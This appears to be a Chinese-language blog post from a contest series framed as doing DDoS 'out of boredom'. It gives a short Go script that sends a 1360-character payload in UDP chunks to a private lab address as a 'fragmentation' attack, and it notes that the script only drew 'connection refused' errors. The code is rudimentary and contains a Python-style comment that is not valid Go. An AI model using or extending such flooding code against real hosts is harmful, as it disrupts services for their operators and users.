---
author: Sunny Tsai
title: "[Day 29] 閑的沒事 - Fragmentation UDP"
date: 2023-10-12
math: true
tags: [
    "cloud",
    "fragmentation attack",
    "udp"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
# Code
udp封包分片
```go
package main

import (
	"fmt"
	"log"
	"net"
	"time"
)

func main() {
	targetIP := "10.211.55.10"
	targetPort := 12345

	udpAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
	if err != nil {
		log.Fatal(err)
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	payload := `又是熟悉的payload，總長1360`
	fmt.Println(len(payload))  # 1360

	chunkSize := 1000
	for i := 0; i < len(payload); i += chunkSize {
		end := i + chunkSize
		if end > len(payload) {
			end = len(payload)
		}

		_, err = conn.Write([]byte(payload[i:end]))
		if err != nil {
			log.Fatal(err)
		}

		fmt.Printf("Sent fragment: %s\n", payload[i:end])
		time.Sleep(1 * time.Millisecond)
	}

	fmt.Println("Packet sent successfully!")
}
```


# 測試
chunkSize不管是設定100還是1000的時候，通常只發送一次封包後下一次發送就會出現connection refused的錯誤訊息。因為我啟動一個Flask Web Endpoint監聽這個端口，Flask web service默認只支援HTTP over TCP。當我測試時使用UDP協議向目標主機發送請求時，由於Flask不處理 UDP 請求，因此不會有任何響應。當我的UDP客戶端再次嘗試發送時，就會收到一個`connection refused`的錯誤。

看起來做壞事分片發送不能常用UDP協議了，容易出現`connection refused`。用其他常用的PORT也是如此。
